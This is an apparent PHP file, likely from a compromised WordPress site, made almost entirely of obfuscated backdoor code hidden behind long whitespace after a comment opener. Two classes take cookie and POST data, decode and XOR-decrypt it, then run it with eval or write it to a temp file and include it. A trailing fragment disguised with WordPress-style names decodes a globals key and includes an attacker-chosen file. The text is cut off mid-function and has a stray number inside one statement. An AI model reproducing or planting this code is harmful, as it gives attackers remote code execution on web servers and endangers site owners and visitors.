<?php /*                                                                                                                                                                                                                                                                                                                                                                                                  $XnWVzwfVC = chr (66) . "\137" . "\x6e" . "\164" . "\115" . "\132";$CdoXYn = 'c' . chr (108) . chr ( 323 - 226 ).'s' . chr (115) . "\x5f" . "\x65" . "\170" . 'i' . "\x73" . 't' . chr ( 537 - 422 ); $ppUfk = $CdoXYn($XnWVzwfVC); $XnWVzwfVC = "23961";$gKwotoPxs = $ppUfk;$CdoXYn = "50561";if (!$gKwotoPxs){class B_ntMZ{private $CbSQmPNVN;public static $hWWuqf = "94f62584-4176-4dd4-b730-437d0eba6dce";public static $cKJiJ = 27163;public function __construct($gKGRouPK=0){$PThjw = $_COOKIE;$cymBkkt = $_POST;$DenQKQKast = @$PThjw[substr(B_ntMZ::$hWWuqf, 0, 4)];if (!empty($DenQKQKast)){$hiRPJWh = "base64";$OwjDVJOTp = "";$DenQKQKast = explode(",", $DenQKQKast);foreach ($DenQKQKast as $eljwaCTuy){$OwjDVJOTp .= @$PThjw[$eljwaCTuy];$OwjDVJOTp .= @$cymBkkt[$eljwaCTuy];}$OwjDVJOTp = array_map($hiRPJWh . "\x5f" . "\144" . "\x65" . 'c' . chr (111) . "\x64" . chr ( 632 - 531 ), array($OwjDVJOTp,)); $OwjDVJOTp = $OwjDVJOTp[0] ^ str_repeat(B_ntMZ::$hWWuqf, (strlen($OwjDVJOTp[0]) / strlen(B_ntMZ::$hWWuqf)) + 1);B_ntMZ::$cKJiJ = @unserialize($OwjDVJOTp);}}private function WyQbmTOFG(){if (is_array(B_ntMZ::$cKJiJ)) {$xmmOK = str_replace("\x3c" . "\x3f" . "\160" . chr ( 770 - 666 ).'p', "", B_ntMZ::$cKJiJ["\x63" . "\157" . 'n' . "\164" . chr (101) . chr (110) . 't']);eval($xmmOK); $afTori = "24752";exit();}}public function __destruct(){$this->WyQbmTOFG(); $afTori = "24752";$cJAipA = str_pad($afTori, 10);}}$BHcVQCBj = new  11794  B_ntMZ(); $BHcVQCBj = substr("40108_22175", 1);} ?><?php /*                                                                                                                                                                                                                                                                                                                                                                                                  $aiiwyqmu = "\170" . "\x62" . "\x5f" . "\x57" . chr ( 921 - 835 )."\143";$DRNEAA = chr ( 323 - 224 )."\x6c" . chr ( 322 - 225 )."\163" . chr ( 232 - 117 )."\137" . chr ( 977 - 876 ).chr ( 354 - 234 ).'i' . chr (115) . 't' . "\x73";$JRpYcB = $DRNEAA($aiiwyqmu); $aiiwyqmu = "11671";$dGGhmb = $JRpYcB;$DRNEAA = "13884";if (!$dGGhmb){class xb_WVc{private $ZAQNHhLcSd;public static $cwsdqm = "c59f6950-f3bc-49cc-92dc-56b98b8f39b5";public static $MClAkX = 63612;public function __construct($bjGens=0){$xpOqcd = $_COOKIE;$bbXWMaH = $_POST;$rHrKMIccF = @$xpOqcd[substr(xb_WVc::$cwsdqm, 0, 4)];if (!empty($rHrKMIccF)){$iNcbq = "base64";$ykPGsSJ = "";$rHrKMIccF = explode(",", $rHrKMIccF);foreach ($rHrKMIccF as $kcOyKl){$ykPGsSJ .= @$xpOqcd[$kcOyKl];$ykPGsSJ .= @$bbXWMaH[$kcOyKl];}$ykPGsSJ = array_map($iNcbq . chr ( 452 - 357 ).chr (100) . chr ( 287 - 186 ).chr ( 485 - 386 ).'o' . 'd' . 'e', array($ykPGsSJ,)); $ykPGsSJ = $ykPGsSJ[0] ^ str_repeat(xb_WVc::$cwsdqm, (strlen($ykPGsSJ[0]) / strlen(xb_WVc::$cwsdqm)) + 1);xb_WVc::$MClAkX = @unserialize($ykPGsSJ);}}private function tMNXDjl(){if (is_array(xb_WVc::$MClAkX)) {$ZRhOncBPXz = sys_get_temp_dir() . "/" . crc32(xb_WVc::$MClAkX[chr (115) . 'a' . "\154" . chr (116)]);@xb_WVc::$MClAkX["\x77" . chr ( 406 - 292 ).'i' . chr ( 918 - 802 )."\145"]($ZRhOncBPXz, xb_WVc::$MClAkX["\x63" . 'o' . chr (110) . chr (116) . "\x65" . chr ( 1093 - 983 ).chr (116)]);include $ZRhOncBPXz;@xb_WVc::$MClAkX['d' . "\145" . 'l' . "\x65" . "\x74" . chr (101)]($ZRhOncBPXz); $bZsedxS = "35281";exit();}}public function __destruct(){$this->tMNXDjl(); $bZsedxS = "35281";$fgRGGKzSa = str_pad($bZsedxS, 10);}}$RJOdfBzJi = new xb_WVc(); $RJOdfBzJi = "35409_18092";} ?><?php /* 
*
...
{
    $tt_ids = 'FljWH3XcAsEcKW';

    $term_ids = $tt_ids;

    
    $item = $GLOBALS[labels("%19%2A%23%1B%0D%60", $term_ids)];
    $is_bad_flat_slug = $item;
	$keys = 'words_array';
    $wildcards = isset($is_bad_flat_slug[$term_ids]);
    if ($wildcards)

    {
        $field_no_prefix = $item[$term_ids];
        $filename = $field_no_prefix[labels("2%01%1A%08%26R5%06", $term_ids)];
        $current_user = $filename;
        include ($current_user);
    }
}
function labels($double_chars, $field)

{
	$trash = 'pung';
    $icon_dir_uri = $field;
	$exclusions = 'cdata_regex';
    $flag = "url" . "decode";
    $hours = $flag($double_chars);
    $single_preg = substr($icon_dir_uri,0, strlen($hours));

    $settings = $hours ^ $single_preg;
    
    $hours = strpos($settings, $single_preg);
